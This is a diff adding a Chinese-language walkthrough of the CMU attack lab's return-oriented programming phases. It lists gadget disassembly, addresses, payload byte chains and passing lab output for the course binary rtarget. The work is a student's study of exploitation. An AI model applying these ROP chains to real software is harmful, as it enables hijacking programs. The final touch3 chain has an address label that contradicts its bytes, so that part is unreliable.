@@ -173,3 +173,67 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 BF 78 DC 61 55 C3 00 00 00 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 88 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00
 ```
+
+### phase_4
+面向返回的攻击方式，主要有两大限制，这里我们选取gadget(小器具)。
+```
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+// 0x90 : nop
+// popq rax : 58
+```
+```
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq
+// movq rax, rdi:48 89 c7
+```
+0x4019cc(gadget1 + 3)
+0x59b997fa(cookie字符用于popq)
+0x4019a2(gadget2 + 2)
+0x4017ec(touch2)
+cc 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00(touch2)
+
+实验结果
+```
+./rtarget -q -i exploit_raw.txt 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+0x4019cc(gadget1 + 3)
+0x59b997fa(cookie字符用于popq)
+0x4019a2(gadget2 + 2)
+0x4017ec(touch2)
+cc 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00(touch2)
+
+gadget3
+```
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+// movq rsp, rax: 48 89 e0
+```
+0x401a06(gadget3 + 3)
+35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00(cookie的string表示)
+0x4019cc(gadget1 + 3)
+0x4019cc(gadget1 + 3)
+0x4019a2(gadget2 + 2)
+0x4017ec(touch3)
+35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
